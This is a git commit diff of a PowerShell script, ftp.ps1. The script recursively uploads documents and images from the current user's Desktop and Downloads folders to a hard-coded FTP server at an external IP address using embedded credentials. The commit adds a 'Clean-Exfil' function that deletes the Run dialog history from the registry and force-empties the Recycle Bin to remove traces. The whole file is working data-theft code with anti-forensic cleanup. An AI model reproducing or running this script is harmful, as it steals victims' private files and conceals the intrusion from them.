989b731e3f6475e8e690bac4d6bdee30ee9d89fd
louist12 <114141279+louist12@users.noreply.github.com>
2022-10-07 12:12:28 +0530

    Update ftp.ps1

--- ftp.ps1
+++ ftp.ps1
@@ -1,9 +1,14 @@
-﻿$WebClient = New-Object System.Net.WebClient
+$WebClient = New-Object System.Net.WebClient
 $Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads"
-$FTP = "ftp://testadmin:testpassword@192.119.71.89/testing/"
+$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
 
 
 foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse)){
     $URI = New-Object System.Uri($FTP+$item.Name)
     $WebClient.UploadFile($URI, $item.FullName)
 }
+function Clean-Exfil{
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Explorer\RunMRU /va /f
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+ }
+ Clean-Exfil
